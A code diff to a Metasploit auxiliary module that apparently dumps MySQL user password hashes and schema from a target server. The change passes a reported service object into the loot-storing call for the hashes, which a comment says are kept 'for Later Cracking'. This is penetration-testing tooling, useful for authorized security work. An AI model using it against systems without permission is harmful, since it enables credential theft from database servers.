@@ -44,6 +44,14 @@ class Metasploit3 < Msf::Auxiliary
 			print_error("There was an error reading the MySQL User Table")
 			return
 		end
+		
+		this_service = report_service(
+					:host  => datastore['RHOST'],
+					:port => datastore['RPORT'],
+					:name => 'mysql',
+					:proto => 'tcp'
+					)
+
 
 		#create a table to store data
 		tbl = Rex::Ui::Text::Table.new(
@@ -59,7 +67,7 @@ class Metasploit3 < Msf::Auxiliary
 			end
 		end
 
-		report_hashes(tbl.to_csv) unless tbl.rows.empty?
+		report_hashes(tbl.to_csv, this_service) unless tbl.rows.empty?
 
 		#Recursively grab the schema for the entire DB server
 		mysql_schema={}
@@ -79,10 +87,10 @@ class Metasploit3 < Msf::Auxiliary
 	end
 
 	#Stores the Hash Table as Loot for Later Cracking
-	def report_hashes(hash_loot)
+	def report_hashes(hash_loot,service)
 
 		filename= "#{datastore['RHOST']}-#{datastore['RPORT']}_mysqlhashes.txt"
-		path = store_loot("mysql.hashes", "text/plain", datastore['RHOST'], hash_loot, filename, "MySQL Hashes")
+		path = store_loot("mysql.hashes", "text/plain", datastore['RHOST'], hash_loot, filename, "MySQL Hashes",service)
 		print_status("Hash Table has been saved: #{path}")
 
 	end
